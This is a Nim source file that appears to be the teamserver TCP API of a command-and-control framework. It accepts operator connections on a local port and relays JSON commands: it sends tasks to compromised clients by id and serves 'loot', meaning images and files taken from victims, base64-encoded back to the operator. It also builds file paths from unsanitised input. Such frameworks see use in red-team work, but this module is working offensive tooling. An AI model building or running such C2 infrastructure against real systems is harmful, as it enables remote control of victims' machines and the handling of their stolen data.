import std/[
  asyncdispatch, 
  asyncnet,
  asyncfutures, 
  strutils, 
  json, 
  os,
  base64
]

import teamserverApi

import types, logging, communication, loot

proc processMessages(server: C2Server, tcpSocket: AsyncSocket) {.async.} =

  while true:
    let line = await tcpSocket.recvLine(maxLength=1000000)

    if line.len == 0:
      tcpSocket.close()
      break
 
    echo line
    if line == "connected": 
      server.sendClients()
      server.sendTasks()
      server.sendLoot()
    else:
      let j = parseJson(line)
      let event = j["event"].getStr()
      case event:
      of "sendtask":
        discard await sendClientTask(
          server.getClientById(j["clientId"].getStr()),
          j["taskName"].getStr(),
          j["taskParams"]  
        )
      of "lootdownload":
        let fileName = j["file"].getStr()
        let lootType: LootType = parseEnum[LootType](j["lootType"].getStr())
        let rootDirectory = getLootDirectory(
          server.getClientById(j["clientId"].getStr())
        ) 
        var filePath: string = ""
        case lootType:
        of LootImage: filePath = rootDirectory & "/images/" & fileName
        of LootFile: filePath = rootDirectory & "/files/" & fileName
        if fileExists(filePath):
          await tcpSocket.send($(%*{
            "event": "lootdata",
            "data": {"file": filePath,
            "fileData": encode readFile(filePath)}
          }) & "\r\n")
    

proc startTcpApi*(server: C2Server, port = 5051, ip = "127.0.0.1") {.async.} =
  
  let tcpSocket = newAsyncSocket()
  try:
    tcpSocket.setSockOpt(OptReuseAddr, true)
    tcpSocket.bindAddr(port.Port, ip)
    tcpSocket.listen()
  except OSError:
    errorLog getCurrentExceptionMsg()
    return
  
  while true:
    let 
      (_, clientSocket) = await tcpSocket.acceptAddr()
    server.teamserverClients.add clientSocket
    asyncCheck processMessages(server, clientSocket)